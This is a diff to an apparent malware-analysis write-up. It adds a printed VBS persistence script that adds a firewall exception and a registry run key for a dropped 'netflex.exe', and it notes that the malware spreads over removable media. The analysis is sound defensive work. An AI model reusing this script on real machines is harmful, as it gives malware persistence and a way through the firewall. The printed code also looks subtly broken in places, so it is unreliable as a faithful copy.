@@ -67,6 +67,29 @@ _Base64 Snippet:_
 
 Once this code is injected and executed, it drops a PE in the location 'C:\Users\user\AppData\Roaming\netflex\netflex.exe', as well as employing some persistence mechanisms, such as a vbs script in the startup folder and a registry run key.
 
+**VBS Script**
+```
+dim shellobj
+set shellobj = wscript.createobject("http://wscript.shell")
+ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
+cmdshell(ddd)
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\"
+split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
+function cmdshell (cmd)
+dim httpobj,oexec,readallfromany
+set oexec = shellobj.exec ("%comspec% /C /Q /K /S"
+if not oexec.stdout.atendofstream then
+readallfromany = oexec.stdout.readall
+elseif not oexec.stderr.atendofstream then
+readallfromany = oexec.stderr.readall
+readallfromany = ""
+end if
+cmdshell = readallfromany
+end function
+```
+
+Added to the Startup directory, the vbs script adds the 'netflex' binary as an exception against Windows Firewall and creates a registry run key as a persistence mechanism.
+
 ## 1st Executable 
 
 Taking a look at the dropped 'netflex.exe' in DNSpy, there are a few things to note.
@@ -124,7 +147,7 @@ Within this executable, we can see the C2 domain and installation directory bein
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6f7fd25f-61d4-4658-bfac-a22c4f894da3)
 
-There is also the capability for replication across removable media drives.
+There is also the capability for replication across removable media drives, creating the same vbs script which was mentioned before.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/381c8cc6-fca3-42da-ad73-5d1b4f3e790f)
 
